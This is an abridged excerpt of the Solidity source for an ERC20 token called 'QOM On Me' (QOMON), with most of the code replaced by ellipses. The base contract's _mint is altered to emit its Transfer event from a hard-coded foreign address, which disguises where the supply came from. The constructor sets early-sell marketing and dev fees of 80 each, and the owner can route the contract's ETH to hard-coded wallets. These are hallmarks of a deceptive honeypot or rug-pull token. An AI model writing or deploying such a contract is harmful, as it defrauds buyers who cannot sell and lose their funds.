...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0xFFA22CdAa7098e6655300C54daD3dAC15f4eeB55), account, amount);
    }
...
contract QOMOnMe is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("QOM On Me", "QOMON") {
        ...
        uint256 _earlySellMarketingFee = 80;
	    uint256 _earlySellDevFee = 80;
 
        uint256 totalSupply = 1 * 1e12 * 1e18;
 
        maxTransactionAmount = totalSupply * 5 / 1000; // 0.5% maxTransaction amount.
        maxWallet = totalSupply * 25 / 1000; // 2.5% maxWallet amount.
        ...
        marketingWallet = 0xF4EdaCee2459F2194A6436cE8A839230Caada836; // set as marketing wallet
        devWallet = 0x602F091f6F28f41FadD5dD7c35246208797Beb0c; // set as dev wallet
        teamwallet = 0x1c6C87404248F40D3c0f09A56215c4A94b72FEB8; // set as team wallet
    ...
    function manualsend() external onlyOwner() {
        ...
        uint256 ethTeam = ethMarketing.div(2);
        uint256 ethMarket = ethMarketing.div(2);
    ...
    function swapBack() private {
        ...
        uint256 ethForTeam = ethForMarketing.div(2);
        uint256 ethformarketing = ethForMarketing.div(2);
